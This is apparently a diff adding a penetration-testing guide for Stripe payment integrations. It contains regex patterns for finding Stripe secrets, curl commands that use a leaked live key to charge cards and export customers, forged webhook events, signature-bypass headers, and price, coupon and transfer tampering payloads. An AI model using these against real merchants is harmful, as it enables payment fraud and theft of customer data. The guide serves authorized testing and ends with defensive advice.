@@ -1,0 +1,477 @@
+<stripe_security_guide>
+<title>STRIPE SECURITY TESTING</title>
+
+<critical>Stripe handles payment processing for millions of businesses. Security vulnerabilities in Stripe integrations can lead to financial fraud, unauthorized transactions, data theft, and compliance violations. Testing must cover API key exposure, webhook security, and payment flow integrity.</critical>
+
+<scope>
+- API key management (secret, publishable, restricted)
+- Webhook signature verification
+- Payment Intent and Setup Intent flows
+- Idempotency key manipulation
+- Price and quantity tampering
+- Subscription management
+- Connect platform security
+- Customer and payment method data
+</scope>
+
+<methodology>
+1. Identify Stripe integration points: API calls, webhooks, client-side code.
+2. Test for API key exposure in client-side code, logs, and error messages.
+3. Examine webhook endpoints for signature bypass vulnerabilities.
+4. Test payment flows for price manipulation and race conditions.
+5. Verify subscription and billing logic integrity.
+</methodology>
+
+<api_key_exposure>
+<detection>
+{% raw %}
+# Stripe API key patterns
+sk_live_[a-zA-Z0-9]{24,}     # Secret key (CRITICAL)
+sk_test_[a-zA-Z0-9]{24,}     # Test secret key
+pk_live_[a-zA-Z0-9]{24,}     # Publishable key (expected in client)
+pk_test_[a-zA-Z0-9]{24,}     # Test publishable key
+rk_live_[a-zA-Z0-9]{24,}     # Restricted key
+rk_test_[a-zA-Z0-9]{24,}     # Test restricted key
+whsec_[a-zA-Z0-9]{32,}       # Webhook signing secret
+
+# Search locations
+# - JavaScript source files
+# - Mobile app binaries (APK, IPA)
+# - Environment variable leaks
+# - Error messages and stack traces
+# - Git repository history
+# - Configuration files
+{% endraw %}
+</detection>
+
+<exploitation>
+{% raw %}
+# With exposed secret key:
+# List all customers
+curl https://api.stripe.com/v1/customers \
+  -u sk_live_exposed_key:
+
+# Create unauthorized charges
+curl https://api.stripe.com/v1/charges \
+  -u sk_live_exposed_key: \
+  -d amount=10000 \
+  -d currency=usd \
+  -d source=tok_visa
+
+# Access payment methods
+curl https://api.stripe.com/v1/payment_methods \
+  -u sk_live_exposed_key:
+
+# Export customer data
+curl https://api.stripe.com/v1/customers?limit=100 \
+  -u sk_live_exposed_key:
+{% endraw %}
+</exploitation>
+</api_key_exposure>
+
+<webhook_attacks>
+<signature_bypass>
+{% raw %}
+# Webhook signature header
+Stripe-Signature: t=1234567890,v1=signature_hash
+
+# Bypass attempts:
+
+# 1. Missing signature handling
+# Send request without Stripe-Signature header
+# Check if webhook still processes
+
+# 2. Empty/invalid signature
+Stripe-Signature: 
+Stripe-Signature: invalid
+Stripe-Signature: t=0,v1=0
+
+# 3. Timestamp tolerance bypass
+# Use very old timestamp
+Stripe-Signature: t=1,v1=calculated_with_old_timestamp
+
+# 4. Signature confusion
+# Send v0 signature if v1 is expected
+Stripe-Signature: t=1234567890,v0=signature_hash
+{% endraw %}
+</signature_bypass>
+
+<webhook_manipulation>
+{% raw %}
+# Forge webhook events (if signature not verified):
+
+# Payment success without actual payment
+{
+  "type": "payment_intent.succeeded",
+  "data": {
+    "object": {
+      "id": "pi_forged",
+      "amount": 10000,
+      "status": "succeeded"
+    }
+  }
+}
+
+# Subscription created/updated
+{
+  "type": "customer.subscription.created",
+  "data": {
+    "object": {
+      "id": "sub_forged",
+      "customer": "cus_target",
+      "status": "active"
+    }
+  }
+}
+
+# Invoice paid
+{
+  "type": "invoice.paid",
+  "data": {
+    "object": {
+      "id": "in_forged",
+      "customer": "cus_target",
+      "paid": true
+    }
+  }
+}
+{% endraw %}
+</webhook_manipulation>
+
+<webhook_endpoint_discovery>
+{% raw %}
+# Common webhook endpoint paths
+/webhook/stripe
+/webhooks/stripe
+/api/webhook/stripe
+/api/webhooks/stripe
+/stripe/webhook
+/stripe/webhooks
+/api/stripe/webhook
+/payment/webhook
+/billing/webhook
+
+# Test with OPTIONS/HEAD to identify endpoints
+# Check for different responses with/without signature
+{% endraw %}
+</webhook_endpoint_discovery>
+</webhook_attacks>
+
+<payment_manipulation>
+<price_tampering>
+{% raw %}
+# Client-side price manipulation
+# If price is sent from client:
+
+POST /api/create-payment-intent
+{
+  "amount": 1,            # Changed from 10000
+  "currency": "usd",
+  "product_id": "prod_xxx"
+}
+
+# Test negative amounts
+{"amount": -1000}
+
+# Test very small amounts
+{"amount": 1}
+
+# Test currency switching
+{"amount": 100, "currency": "inr"}  # vs "usd"
+
+# Test fractional amounts
+{"amount": 0.01}
+{% endraw %}
+</price_tampering>
+
+<quantity_manipulation>
+{% raw %}
+# Product quantity attacks
+
+# Order 10 items, pay for 1
+{
+  "items": [
+    {"product_id": "prod_xxx", "quantity": 10}
+  ],
+  "payment_amount": 1000  # Price of 1 item
+}
+
+# Negative quantity
+{"quantity": -1}
+
+# Zero quantity with positive total
+{"quantity": 0, "total": 10000}
+{% endraw %}
+</quantity_manipulation>
+
+<idempotency_attacks>
+{% raw %}
+# Idempotency key manipulation
+
+# Replay attack
+# Use same idempotency key for different operations
+Idempotency-Key: unique_key_123
+
+# First request: legitimate payment
+POST /v1/charges
+Idempotency-Key: key_abc
+{"amount": 1000}
+
+# Second request: higher amount with same key
+POST /v1/charges
+Idempotency-Key: key_abc
+{"amount": 100000}
+
+# Key collision
+# Try common/predictable keys
+Idempotency-Key: 1
+Idempotency-Key: test
+Idempotency-Key: [customer_id]
+{% endraw %}
+</idempotency_attacks>
+
+<race_conditions>
+{% raw %}
+# Race condition in payment verification
+
+# 1. Send multiple checkout requests simultaneously
+# 2. Only one payment charged, multiple orders created
+
+# Payment intent race
+# Create multiple intents, confirm one, cancel verification for others
+
+# Subscription race
+# Upgrade/downgrade simultaneously to get best of both
+{% endraw %}
+</race_conditions>
+</payment_manipulation>
+
+<subscription_attacks>
+<subscription_manipulation>
+{% raw %}
+# Trial period abuse
+# Modify trial_end timestamp
+{
+  "trial_end": 4102444800  # Far future date
+}
+
+# Plan switching
+# Downgrade plan but keep premium features
+{
+  "items": [{"price": "price_basic"}],
+  "proration_behavior": "none"
+}
+
+# Quantity manipulation in subscriptions
+{
+  "items": [{"price": "price_per_seat", "quantity": 1000}],
+  "payment_behavior": "allow_incomplete"
+}
+
+# Cancel and reactivate abuse
+# Cancel before charge, reactivate after
+{% endraw %}
+</subscription_manipulation>
+
+<coupon_attacks>
+{% raw %}
+# Coupon code enumeration
+# Brute force common patterns:
+WELCOME10
+SAVE20
+DISCOUNT50
+[COMPANY]100
+
+# Coupon stacking
+# Apply multiple coupons if not properly restricted
+{"coupon": "CODE1"}
+{"coupon": "CODE2"}
+
+# Expired coupon bypass
+# Modify client-side coupon validation
+
+# Coupon ID manipulation
+# Try sequential IDs: coup_1, coup_2, etc.
+{% endraw %}
+</coupon_attacks>
+</subscription_attacks>
+
+<connect_platform>
+<connected_account_attacks>
+{% raw %}
+# Unauthorized access to connected accounts
+# Test with different account IDs
+
+Stripe-Account: acct_target_account
+
+# Transfer manipulation
+{
+  "amount": 10000,
+  "currency": "usd",
+  "destination": "acct_attacker_account"
+}
+
+# Payout manipulation
+{
+  "amount": 10000,
+  "currency": "usd"
+}
+
+# Account creation without proper verification
+{% endraw %}
+</connected_account_attacks>
+
+<platform_fee_bypass>
+{% raw %}
+# Bypass platform fees
+{
+  "application_fee_amount": 0,
+  "transfer_data": {
+    "destination": "acct_connected"
+  }
+}
+
+# Negative fees (refund to self)
+{"application_fee_amount": -1000}
+{% endraw %}
+</platform_fee_bypass>
+</connect_platform>
+
+<client_side_attacks>
+<stripe_elements_manipulation>
+{% raw %}
+# Stripe.js manipulation
+# Intercept and modify Stripe.js calls
+
+# Payment method creation
+stripe.createPaymentMethod({
+  type: 'card',
+  card: elements.getElement('card'),
+  billing_details: {
+    name: 'Modified Name',
+    email: 'attacker@evil.com'  # Changed email
+  }
+});
+
+# Confirm payment with modified data
+stripe.confirmCardPayment(clientSecret, {
+  payment_method: 'pm_attacker_method'  # Substitute payment method
+});
+{% endraw %}
+</stripe_elements_manipulation>
+
+<client_secret_exposure>
+{% raw %}
+# PaymentIntent client secret exposure
+# Pattern: pi_xxx_secret_xxx
+
+# If client secret is exposed:
+# - Attacker can confirm payment on their behalf
+# - Potential for payment hijacking
+
+# Test for client secret in:
+# - Page source
+# - API responses
+# - Local storage
+# - URL parameters
+{% endraw %}
+</client_secret_exposure>
+</client_side_attacks>
+
+<data_exposure>
+<customer_data>
+{% raw %}
+# IDOR in customer endpoints
+GET /api/customer/cus_another_user
+
+# Customer ID enumeration
+cus_1, cus_2, cus_3...
+
+# Payment method exposure
+GET /api/payment-methods/pm_xxx
+
+# Subscription data leakage
+GET /api/subscription/sub_xxx
+{% endraw %}
+</customer_data>
+
+<invoice_exposure>
+{% raw %}
+# Invoice access without authorization
+GET /invoices/in_xxx
+
+# Invoice PDF generation
+GET /invoices/in_xxx/pdf
+
+# Hosted invoice page manipulation
+https://invoice.stripe.com/i/acct_xxx/in_xxx
+{% endraw %}
+</invoice_exposure>
+</data_exposure>
+
+<common_payloads>
+{% raw %}
+# Price manipulation
+{"amount": 1}
+{"amount": -100}
+{"amount": 0}
+
+# Webhook event forgery
+{"type": "payment_intent.succeeded", "data": {...}}
+{"type": "checkout.session.completed", "data": {...}}
+
+# Coupon codes to test
+ADMIN
+TEST
+DEBUG
+100OFF
+FREE
+
+# API key patterns to search for
+sk_live_
+sk_test_
+whsec_
+rk_live_
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate unauthorized API access with exposed keys.
+2. Show webhook bypass leading to fraudulent order fulfillment.
+3. Prove price manipulation resulting in undercharged payments.
+4. Document the exact endpoint and parameters exploited.
+5. Provide evidence of financial impact or data exposure.
+</validation>
+
+<false_positives>
+- Publishable keys in client-side code (expected)
+- Test mode keys (sk_test_) in development environments
+- Webhook signature properly verified with timing-safe comparison
+- Server-side price calculation from product database
+- Idempotency properly implemented with key validation
+</false_positives>
+
+<impact>
+- Financial fraud through unauthorized transactions
+- Revenue loss via price manipulation
+- Data breach of customer payment information
+- Business logic bypass through webhook forgery
+- Subscription abuse affecting recurring revenue
+- Compliance violations (PCI-DSS)
+</impact>
+
+<pro_tips>
+1. Always search for sk_live_ patterns in source code and logs.
+2. Test webhook endpoints without signature first; many skip verification.
+3. Check if price is calculated server-side from product ID or sent from client.
+4. Look for idempotency key reuse vulnerabilities in payment flows.
+5. Test subscription modifications during billing cycle transitions.
+6. Check for race conditions in checkout and payment confirmation.
+7. Examine Connect platform integrations for transfer manipulation.
+8. Test coupon validation with expired and invalid codes.
+9. Look for customer/payment method IDOR vulnerabilities.
+10. Monitor for client secrets exposed in API responses.
+</pro_tips>
+
+<remember>Stripe integration security requires proper API key management, webhook signature verification, and server-side payment validation. Never trust client-side price or quantity data. Always verify payment status through Stripe API before fulfilling orders, and implement proper idempotency for all payment operations.</remember>
+</stripe_security_guide>
